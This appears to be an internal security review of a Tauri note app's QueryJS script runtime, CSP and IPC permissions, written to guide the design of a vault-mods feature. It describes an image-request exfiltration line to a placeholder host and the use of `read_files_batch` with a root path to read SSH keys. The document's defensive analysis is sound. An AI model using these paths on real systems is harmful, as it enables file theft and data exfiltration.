# V1: Existing user-JS runtime (QueryJS, templates) and webview CSP

Validator: opus. Inputs: S01, S02, S03, S05 (haiku). S04 (templates JS) is missing because that scout died, so this report answers its question directly (section "S04 answered").

Bottom line: there is exactly one place where user JS runs today, QueryJS (`new Function` in the main webview realm, no sandbox, no timeout, no cancel). Anything that runs there, or anywhere in the main webview, can already call every custom Tauri command with no ACL check. That includes `read_files_batch` with a caller-chosen root, which can read any file on disk, and `create_note`, which can create any new file anywhere. So the real boundary for vault mods is the IPC surface, not CSP and not the `kb` API. QueryJS already runs vault-supplied code on note open by default, and the policy that controls this lives inside the vault.

## Verified facts (file:line)

### Execution model (QueryJS)
- Block bodies: `new Function('kb', 'dv', \`return (async () => { ${jsContent} })()\`)`, called as `fn(api, api)`, then `await api.awaitAllPending()`. See `src/lib/plugins/queryjs/kb-api.ts:551-555`.
- `.js` scripts through `kb.view()`: `new Function('kb', 'dv', 'input', wrappedCode)` at `kb-api.ts:413`. The code is wrapped in an async IIFE only when the source text contains the substring `await` (`kb-api.ts:409-411`), so a comment containing "await" changes the semantics (for example, a top-level `return`).
- These are the only two dynamic-code sites in the frontend. A grep of `src/lib` and `src/routes` for `new Function|AsyncFunction|eval(|new Worker|srcdoc|sandbox=` finds only `kb-api.ts:413` and `:552`. No Worker, iframe sandbox or `?worker` import exists anywhere in the app.
- `Function`-constructed code runs in the global scope of the main webview realm. It cannot see module closures (stores, services). No app code assigns stores to `window`/`globalThis` (grep for `window.x =` / `globalThis.x =` finds nothing). It can see `window`, `document` and `window.__TAURI_INTERNALS__`.
- `window.__TAURI_INTERNALS__.invoke` is necessarily present. The app's own `@tauri-apps/api` 2.12.4 calls `window.__TAURI_INTERNALS__.invoke(cmd, args, options)` at call time (`node_modules/@tauri-apps/api/core.js:341`), and the app's typed wrapper `call()` goes through it (`src/lib/contracts/ipc.ts:1,20-26`). `withGlobalTauri` is absent from `tauri.conf.json` (whole file read), but that only controls `window.__TAURI__`, not the internals object.
- The widget: `execute()` at `src/lib/plugins/queryjs/queryjs-block-widget.ts:226-280` builds `KBAPI` (`:245-254`) with `loadScript: loadExternalScript`. `loadExternalScript` is a bare `readTextFile(absolutePath)` from plugin-fs (`src/lib/plugins/queryjs/queryjs.service.ts:1-6`).
- Errors: a block error is caught in `execute()` and rendered by `renderStructuredError` (title, `<details>` stack, "Run again" button) at `queryjs-block-widget.ts:271-276, 288-328`. A failed run is never cached (`:271-276`). `kb.view()` errors are caught inside `runView` and rendered as `div.cm-lp-qjs-error` with `textContent` (`kb-api.ts:415-420`), so `awaitAllPending`'s `Promise.all` cannot reject (`kb-api.ts:387-398`).
- No timeout, abort or cancel exists. The only `setTimeout` in the widget schedules the first-open marker (`queryjs-block-widget.ts:49-59`). `runningContainers` (`:37`, added `:235`, removed `:278`, consulted in `destroy()` `:181`) only keeps `destroy()` from disposing charts of an in-flight run. It cancels nothing.
- ADR 0010 rejected a Web Worker sandbox because `kb.ui.*` writes the widget DOM directly (`docs/adr/0010-queryjs-kb-api-caching.md:71`). It lists "a sandboxed JS execution layer (Workers) is introduced" as a re-evaluation trigger (`:84`).
- Auto-run: the default policy is `'first-open'` (`src/lib/core/settings/settings.store.svelte.ts:140-142`), so a note's queryjs blocks run without a click the first time it is shown (`queryjs-block-widget.ts:136-150`). Settings are stored inside the vault at `<vault>/.kokobrain/settings.json` (`src/lib/core/settings/settings.service.ts:13-19`), so a vault decides its own policy, including `'always'`.
- The user docs say so plainly: "QueryJS runs without a sandbox — you have full access to the DOM" (`help/documentation/13-queryjs.md:1119`).

### Session and teardown
- `resultCache` (Map keyed `filePath\0jsContent`) and `autoRunOnFirstOpen` (Set) are module `$state` (`src/lib/plugins/queryjs/queryjs-session.store.svelte.ts:46-47, 58-61`).
- `clearResults()` runs on every content invalidation (`queryjs-session.store.svelte.ts:121-125`, wired in `src/lib/plugins/queryjs/queryjs-ports.ts:15`).
- Tab close calls only `invalidatePath`, which drops the autoRun marker. Cached results are kept on purpose (`queryjs-ports.ts:6-11, 16`; `queryjs-session.store.svelte.ts:144-148`).
- `reset()` runs at vault teardown (`src/lib/app/lifecycle/app-lifecycle.service.ts:622`) and from settings (`src/lib/plugins/queryjs/QueryjsSection.svelte:40`). The ports are registered at boot (`src/lib/app/boot.ts:40`).
- Nothing cancels in-flight runs. `reset()` swaps in a new Map (`queryjs-session.store.svelte.ts:151-156`), and a run that settles later calls `setResult` (`queryjs-block-widget.ts:270`), which writes into the new Map. The key holds the old vault's absolute path, so the entry is never hit again. It is a leak, not a cross-vault render. Its `KBAPI` captured the old `vaultPath` (`kb-api.ts:103`).

### kb API surface
- `KBApiV1` (`src/lib/plugins/queryjs/contract/kb-api.v1.ts:646-704`) has 3 readonly members (`version`, `container`, `ui`) and 22 function members: pages, pagePaths, current, page, date, tryDate, getDaysInRange, array, isArray, fileLink, compare, equal, number, progressBar, el, paragraph, header, span, list, table, taskList, view.
- `KBUIV1` (`contract/kb-api.v1.ts:608-641`) has 11 members: cards, progressBar, heatmap, tagCloud, tags, statusCards, timeline, table, chart, heatmapCalendar, yearlyCalendar.
- Reads only. The single I/O member is `view` (file read plus execute). No QueryJS file contains `invoke`, `fetch(`, `innerHTML`, `outerHTML`, `insertAdjacentHTML` or `@html` (grep of `src/lib/plugins/queryjs/`, exit 1).
- `private` fields are a TypeScript fiction at runtime. A script can call `kb.loadScript('/any/absolute/path')` (field set at `kb-api.ts:105`), which bypasses `resolveScriptPath`'s `..` check (`kb-api.ts:526-538`). That read is still bounded by the plugin-fs `read-text-file` scope. `kb.vaultPath` is also readable.
- `resolveScriptPath` checks for the `..` substring (`kb-api.ts:534`) and does not handle symlinks.
- Page objects are shared across blocks at one index state (`kb-api.ts:29-48`). `pages()` copies the list but not the objects (`kb-api.ts:128-130`).
- `kb.el` sets attributes with `setAttribute` (`kb-api.ts:262-266`). Inline handlers such as `onclick="..."` set this way do not run, because `script-src` has no `'unsafe-inline'` (`src-tauri/tauri.conf.json:29`). Handlers attached with `addEventListener` on the returned element do run.
- The `kb.ui` text paths use `textContent`. Option strings such as colors are interpolated into `style.cssText` with no escaping (e.g. `kb-ui.ts:118, 202, 283, 308, 329, 346`), and `style-src 'unsafe-inline'` allows it. That is CSS injection (overlays, `url(...)` loads), not script.
- The only interactive controls in `kb.ui` are the table pager buttons (`kb-ui.ts:526, 533`). Chart.js comes from the bundle by dynamic import (`kb-ui.ts:917-920`). `queryjs-charts.ts:16-31` is the WeakMap disposal registry.
- `sanitizeHtml` (DOMPurify allowlist) is at `src/lib/utils/sanitize.ts:7-31`. It forbids script, style, iframe, form and input, but allows the `style`, `href`, `src` and `target` attributes. QueryJS does not use it.

### CSP (`src-tauri/tauri.conf.json:29`)
- `default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' asset: http://asset.localhost data: https:; font-src 'self' data:; connect-src ipc: http://ipc.localhost https://api.todoist.com https://huggingface.co https://github.com https://objects.githubusercontent.com https://*.ingest{,.us,.de}.sentry.io`
- `frame-src`, `worker-src` and `media-src` are not set, so they fall back to `default-src 'self'` (`worker-src` falls back through `script-src`). Remote iframes and `blob:` workers are blocked, as is `import()` of `blob:`/`asset:` URLs.
- `img-src https:` allows a GET to any https host (`new Image().src = 'https://x/?d=...'`). This is a working exfiltration channel that `connect-src` does not close. Missed by every scout.
- `assetProtocol` scope covers `$DOCUMENT/**`, `$DESKTOP/**`, `$PICTURE/**`, `$DOWNLOAD/**`, `$HOME/MyFiles/**`, `$HOME/kokobrain-vault/**` (singular, unlike the fs scope's `kokobrain-vaults`) and the app cache (`tauri.conf.json:30-44`).

### Tauri ACL and capabilities
- Locked versions (`src-tauri/Cargo.lock`): `tauri` 2.12.5 (:5373), `tauri-build` 2.7.4 (:5425), `tauri-utils` 2.10.2 (:5738, the only entry), `tauri-plugin-fs` 2.7.1, `tauri-plugin-http` 2.8.3, `tauri-plugin-dialog` 2.8.4, `tauri-plugin-opener` 2.7.2.
- `src-tauri/build.rs:23` calls `tauri_build::build()` with no app manifest.
- Primary source, `tauri-apps/tauri` tag `tauri-v2.12.5`, `crates/tauri/src/webview/mod.rs` `on_message`: the gate is `if (plugin_command.is_some() || has_app_acl_manifest || !is_local) && request.cmd != FETCH_CHANNEL_DATA_COMMAND && invoke.acl.is_none()`. A non-plugin command from a local origin, with no app manifest, therefore skips the ACL and goes straight to `run_invoke_handler`. Confirmed: every custom command is callable from any local webview.
- `src-tauri/src/lib.rs:325-388` registers 63 app commands. No terminal or PTY command is registered; ADR 0022 is `status: superseded` (`docs/adr/0022-terminal-portable-pty.md:5`), and `portable-pty` is not in `src-tauri/Cargo.toml`. No shell plugin exists (`lib.rs:310-318`, `Cargo.toml:20-72`).
- Two app commands are file-system primitives that ignore every scope:
  - `read_files_batch(vault_path, paths)` (`src-tauri/src/commands/files.rs:23-27`) checks `canonical.starts_with(vault_root)` (`:47`), but `vault_root` comes from the caller's `vault_path`, which `validate_vault_path` only canonicalizes and checks with `is_dir()` (`src-tauri/src/utils/fs.rs:58-66`). With `vault_path: "/"` it reads any text file the user can read (e.g. `~/.ssh/*`). Its own doc comment says the check exists "to prevent arbitrary file reads if the frontend is compromised" (`files.rs:19-20`), and it does not achieve that.
  - `create_note(path, content)` and `create_folder(path)` (`src-tauri/src/commands/vault.rs:984-1022`) only check `ensure_safe_write_path`: the path must be absolute and contain no `..` component (`vault.rs:958-971`). Any new file or folder can be created anywhere the user can write (existing files are refused, `:993-995`).
- `default.json` applies to window `main` only (`src-tauri/capabilities/default.json:5-7`). Its fs grants cover read-dir, read-text-file, write-text-file, mkdir, remove, rename, copy-file and exists for `$DOCUMENT/kokobrain-vaults/**` and `$HOME/kokobrain-vaults/**` (plus `$APPLOG` for write, mkdir and exists) (`:36-222`). `http:allow-fetch*` covers `https://api.todoist.com/**` and `https://raw.githubusercontent.com/diegorv/koko.brain-themes/**` (`:223-266`). Also granted: `opener:default`, `dialog:default`, `clipboard-manager:allow-read-text`, global-shortcut, `core:window:allow-create`, `core:webview:allow-create-webview-window`, `updater:default`, `process:allow-restart` (`:8-35, 267-268`). `fs:allow-read-file` (binary) is not granted.
- `opener:default` 2.7.2 grants `allow-open-url`, `allow-reveal-item-in-dir` and `allow-default-urls`: http, https, mailto and tel (primary source, `plugins-workspace` tag `opener-v2.7.2`, `plugins/opener/permissions/default.toml`). Any webview JS can open any https URL in the browser, which is another exfiltration path.
- `composer.json` grants window `composer` only `core:default`, hide and set-focus (`src-tauri/capabilities/composer.json:5-10`). The composer is built from the same bundle (`WebviewUrl::App("/composer")`, `lib.rs:135-145`), so it can still call all 63 app commands.
- Only two frontend files use plugin-http: `src/lib/core/settings/theme-catalog.service.ts:1,39` and `src/lib/features/tasks/tauri-fetch-adapter.ts:1`.
- No LLM, Anthropic, OpenAI or MCP code exists in `src/lib` or `src-tauri/src` (case-insensitive grep, no hits).
- Webview Sentry, when the user opts in, keeps `GlobalHandlers` (`src/lib/core/settings/sentry.service.ts:58-70`). Uncaught errors from user scripts, including async errors that escape the QueryJS catch, would be reported (INFERRED from the integration list).

### S04 answered: templates and other user-code sites
- Templates do not execute JS. `processTemplate` (`src/lib/utils/template.ts:22-31`) is a hand-written interpreter for `<% %>`. It supports `tp.file.title`, `tp.date.now(...)`, string literals, `+` concatenation and custom-variable lookup (`template.ts:188-216`), and returns unknown expressions unchanged (`:214-215`). It has no `eval` and no `Function`. One quirk: `part in customVariables` walks the prototype chain, so `<% constructor %>` prints `function Object() { [native code] }` (`template.ts:195`). That is cosmetic, not execution.
- `src/lib/plugins/templates/templates.service.ts` only lists, reads and writes files (`:20-125`), and `templates.logic.ts` holds pure string helpers (`:12-32`).
- Meta-bind buttons are declarative. The action types are `updateMetadata`, `open`, `createNote` and `openView` (`src/lib/core/markdown-editor/extensions/live-preview/meta-bind-button.logic.ts:43, 64`). No JS action exists.
- Trust model for templates: none is needed, because they are data. QueryJS is the only Templater-like code runner.

## Refuted or corrected claims

- **S01**: "cleared ... when a tab closes". Wrong. Tab close drops only the autoRun marker, and results survive on purpose (`queryjs-ports.ts:6-11,16`).
- **S01 open question** (`__TAURI_INTERNALS__`, "INFERRED"): resolved as fact. The app's own IPC depends on it (`@tauri-apps/api/core.js:341`).
- **S01 open question** (dynamic `import()`): a static `import` inside a `Function` body is a syntax error. Dynamic `import()` of bare specifiers has no resolver at runtime, and `blob:`/`asset:` URLs are blocked by `script-src 'self'`. `import()` of a `'self'` URL (a hashed app chunk) is not blocked by CSP (INFERRED, not run).
- **S01, S02, S03** ("fetch limited to connect-src hosts" as if that were the network boundary): incomplete. `img-src https:` and `opener:default` both reach any https host. CSP is not an egress control.
- **S01, S02** ("file access limited by fs plugin scope", "only filesystem gate"): wrong as a security statement. `read_files_batch` with a caller-chosen `vault_path` and `create_note`/`create_folder` with any absolute path bypass the plugin-fs scope entirely (`files.rs:23-47`, `utils/fs.rs:58-66`, `vault.rs:958-1022`).
- **S02**: "22 methods + `version` + `container`". `ui` is also a readonly member of `KBApiV1` (`kb-api.v1.ts:652`), so there are 3 readonly members plus 22 function members. S02's ranges (`KBApiV1` 646-704, `KBUIV1` 608-641) are right. **S03**: "KBUIV1 has 10 members" (then lists 11) at "607-650". Correct is 11 members at `608-641`. `KBApiV1.view` is at `699-703`, not "near line 720".
- **S03**: table pager handlers at "kb-ui.ts:505-512, 526-539". The `onclick` assignments are at `kb-ui.ts:526` and `:533`.
- **S03**: "none [of kb.ui] accepts event handlers". The heatmap `tooltip` option is a user callback (`kb-ui.ts:205`, per S03 itself). It is not an event handler, but user code does run inside `kb.ui` calls.
- **S03, implicit**: `kb.el({attr:{onclick:...}})` gives handlers. It does not: an inline handler is blocked by CSP (no `'unsafe-inline'` in `script-src`). Only `addEventListener` works.
- **S05**: "tauri-utils-2.8.2/src/config.rs" defaults. The lockfile resolves only `tauri-utils` 2.10.2 (`Cargo.lock:5738`). The default values cited (freeze_prototype and with_global_tauri both false) are unchanged in practice, but the version citation is wrong. Not re-verified at 2.10.2.
- **S05**: "about 60 app commands". There are 63 (`lib.rs:326-386`). S05 also listed `create_folder` without noting that it, `create_note` and `read_files_batch` are scope-free file primitives. Its own phrase "Path validation is inconsistent" understates this: `read_files_batch`'s containment check is relative to a root the caller picks.
- **S05**: "A folder chosen through the dialog ... becomes readable and writable through plugin-fs". Partly wrong. `openVaultDialog` calls `open({ directory: true, multiple: false })` without `recursive` (`src/lib/core/vault/vault.service.ts:31`). In dialog 2.8.4, `recursive` is `#[serde(default)]` false, and the fs-scope call is `allow_directory(&path, options.recursive)`, so it is non-recursive. The core/asset scope call passes `options.directory`, so that one is always recursive (primary source, `plugins-workspace` tag `dialog-v2.8.4`, `plugins/dialog/src/commands.rs`). No persisted-scope plugin is registered (`lib.rs:310-318`), so the grant is lost on restart (INFERRED). The frontend does not enforce the two vault roots (`vault.service.ts:29-53`); only UI copy mentions them (`src/routes/(app)/+page.svelte:44`).
- **S05**: "No shell plugin, so mods cannot spawn processes from JS". This is true today. Note that the ADR 0022 terminal (portable-pty) is superseded and not registered, so that past process-spawn path is gone too.

## Answers to scouts' open questions

- **Can mod JS call Tauri IPC directly?** Yes. `window.__TAURI_INTERNALS__.invoke` exists in the realm (see above). Plugin commands are ACL-checked against `default.json` for window `main`. App commands are not checked at all (tauri 2.12.5 source).
- **Generic HTTP proxy or process spawn in Rust?** Neither exists. The Rust HTTP calls use fixed hosts: semantic model downloads (S05: `semantic/model.rs:26-51`, not re-read) and update channel URLs. One exception: `configure_sentry(dsn)` (`src-tauri/src/commands/sentry.rs:7-14`) points the Rust Sentry client at a caller-supplied DSN host (INFERRED from the signature; `configure_client` not read). The only `std::process::Command` on a JS-reachable path is `osascript` in quick capture (S05: `quick_capture/source.rs:244`, not re-read).
- **`kb.view` outside `kokobrain-vaults`?** `kb.view` uses plugin-fs `readTextFile` (`queryjs.service.ts:1-6`), so it needs the static scope or the non-recursive runtime dialog scope. A vault picked elsewhere can read top-level `.js` files and fail on subfolders (INFERRED from the dialog source, not run).
- **`kbapi-firewall.test.ts`**: it exists (`src/tests/lib/plugins/queryjs/kbapi-firewall.test.ts:14-21`) and enforces the DTO firewall (no IPC DTO module in contract or public signatures). It is a type and API-shape guard, not a security boundary.
- **canvas `readFile` without `fs:allow-read-file`** (S05 Q2): `src/lib/features/canvas/canvas-image.service.ts:1,35` calls `readFile`, and `default.json` has no `fs:allow-read-file`. The resulting `blob:` URL (`:38-39`) is also not in `img-src`. Probably broken for local canvas images (INFERRED, not run; outside this theme).
- **`withGlobalTauri` at runtime**: absent from config, so `window.__TAURI__` is not injected (INFERRED from the documented default). This is irrelevant for security, because `__TAURI_INTERNALS__` is always there.
- **`ensure_safe_write_path`** (S05 Q4): read. It enforces "absolute, no `..` component" only, with no vault containment (`vault.rs:950-971`).

## Constraints the vault-mods design must respect

1. **There is no sandbox to inherit.** Running mod JS the QueryJS way (`new Function` in the main webview) gives the mod full app privileges: DOM, every app command, plugin-fs on the vault roots, arbitrary file read through `read_files_batch`, arbitrary file creation through `create_note`. A "permission manifest" checked in JS is decorative in that model. The PRD must pick one of two options:
   - **(a) Trusted-by-owner**: same trust as QueryJS, explicit in the docs and a first-run consent prompt.
   - **(b) Real isolation**: a separate realm (sandboxed iframe without `allow-same-origin`, or a Worker served from `'self'`) whose only channel is a host-mediated `postMessage` API, plus an app ACL manifest (`tauri_build::Attributes::app_manifest`) or Rust-side mediation so the isolated realm cannot reach raw `invoke`.

   Option (b) needs the gaps above verified first.
2. **Vault-supplied code already auto-runs.** QueryJS runs on note open by default (`'first-open'`), and the vault's own `.kokobrain/settings.json` sets the policy. Opening a received vault is already code execution. If mods are opt-in per vault (for example a trust prompt on first load of `<vault>/.kokobrain/mods/`), that is stricter than QueryJS. Decide whether QueryJS should join that gate, or document why it does not.
3. **CSP is not an egress control, and the design must not rely on it.** `connect-src` blocks webview `fetch` to arbitrary hosts, so "call an HTTP API" and "call an LLM" cannot use webview `fetch` without a CSP change. But `img-src https:` and `opener:default` already leak to any host. The natural path for HTTP, MCP and LLM is a new Rust command (reqwest is already a dependency, `Cargo.toml:65`) with a per-mod host allow-list enforced in Rust. Widening `connect-src` or `http:allow-fetch` grants every webview script the same reach.
4. **Process spawn (MCP stdio servers, local agents) needs a new Rust trust boundary.** No shell plugin and no registered PTY exist today. Because app commands are not ACL-checked, any new spawn or HTTP command is callable by all webview JS, including QueryJS and the composer. Pair it with an app ACL manifest, or gate it in Rust (for example a per-session capability token the host UI issues on user confirmation).
5. **Loading mod code**: `script-src 'self'` blocks native ES-module import of vault files. Mods must be read as text and evaluated (`'unsafe-eval'` is present), or bundled into a `'self'`-served sandbox host. A static `import` inside mod source will not work under `new Function`. Ship a single-file, no-import format, or a host-provided `require`.
6. **Long-running work needs cancellation.** Neither QueryJS nor anything else has a timeout or abort. A synchronous loop freezes the whole app (main thread). An orchestration mod ("30 haiku + 10 opus") needs an `AbortSignal` threaded through every host API, a visible Stop control, and a vault-teardown hook that aborts in-flight work. Mirror the `queryjsSessionStore.reset()` call site at `app-lifecycle.service.ts:622`, and add the abort that QueryJS lacks. A run must not keep writing after a vault switch: QueryJS captures `vaultPath` at construction (`kb-api.ts:103`), and mods should do the same and check it.
7. **Modal UI**: no `kb.ui` helper builds a modal, form or input. shadcn `dialog`, `input`, `select` and `button` exist in `src/lib/components/ui/` but cannot be imported from evaluated code. The modal should be a host Svelte component driven by a declarative schema the mod returns (fields, actions), with results passed back. Do not hand the mod `document.body`. Render any mod- or LLM-provided HTML through `sanitizeHtml` (`src/lib/utils/sanitize.ts:7-31`), and consider dropping `style`/`target` from its allowlist for mod output. Pass plain text through `textContent`.
8. **Reuse what is clean, not `KBAPI` wholesale.** The read surface (`pages`, `page`, `current`, DataArray, `date`) and the structured-error UX (`queryjs-block-widget.ts:288-328`) are reusable. `KBAPI` itself is bound to a block container, shares mutable page objects across consumers (`kb-api.ts:29-48`) and exposes `loadScript` at runtime. A mod API should be a separate, versioned contract written by hand, following the `contract/kb-api.v1.ts` rules (`:1-27`). It should hand out copies or frozen page data, and expose file writes only through host functions that check vault containment in Rust.
9. **Fixing the IPC holes is a prerequisite for any isolation claim.** `read_files_batch`'s caller-chosen root and `create_note`/`create_folder`'s missing containment are reachable by any webview JS today, QueryJS included. They are existing defects independent of mods. Before the PRD promises "a mod can only touch its vault", those commands must check against the Rust-held open vault path, not a caller argument.
10. **Error reporting**: with Sentry enabled, uncaught mod errors go out through `GlobalHandlers` (`sentry.service.ts:63-70`). Catch errors at the mod-host boundary, render them in the modal, and keep mod source and data out of error messages that can escape.
